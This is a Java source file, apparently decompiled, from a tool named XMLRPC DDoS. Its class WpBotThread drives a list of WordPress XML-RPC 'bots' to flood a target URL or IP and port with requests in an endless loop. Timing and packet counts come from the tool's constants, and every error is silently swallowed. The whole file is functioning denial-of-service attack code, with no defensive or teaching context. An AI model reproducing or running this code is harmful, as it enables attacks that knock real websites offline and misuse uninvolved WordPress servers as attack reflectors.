package xmlrpc.ddos;

import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import xmlrpc.ddos.XMLRPCDDoS;
import xmlrpc.ddos.XMLRPCRequest;
import xmlrpc.ddos.sql.RpcWpBot;

/**
 *
 * @author Melancholia
 */
public class WpBotThread implements Runnable {

   private List bots;
   private String target;
   public boolean started = false;
   private static SecureRandom rand = new SecureRandom();


   public WpBotThread(String targetURL, List bots) {
      this.bots = bots;
      this.target = targetURL;
   }

   public WpBotThread(String ip, int port, List bots) {
      this.bots = bots;
      this.target = "http://" + ip + ":" + port + "/";
   }

   private static int randomValue(int i1, int i2) {
      return rand.nextInt(i2 - i1 + 1) + i1;
   }

   public void run() {
      ArrayList botsRequests = new ArrayList();
      Iterator var3 = this.bots.iterator();

      while(var3.hasNext()) {
         RpcWpBot bot = (RpcWpBot)var3.next();

         try {
            botsRequests.add(new XMLRPCRequest(bot));
         } catch (Exception var8) {
            ;
         }

         try {
            Thread.sleep(100L);
         } catch (Exception var7) {
            ;
         }
      }

      this.started = true;

      while(true) {
         var3 = botsRequests.iterator();

         while(var3.hasNext()) {
            XMLRPCRequest bot1 = (XMLRPCRequest)var3.next();

            try {
               bot1.doRequest(this.target, XMLRPCDDoS.PACKET_PER_BOT_CONNECTION);
            } catch (Exception var6) {
               ;
            }
         }

         try {
            Thread.sleep(XMLRPCDDoS.REQUEST_INTVAL_PER_BOT);
         } catch (InterruptedException var5) {
            ;
         }
      }
   }
}
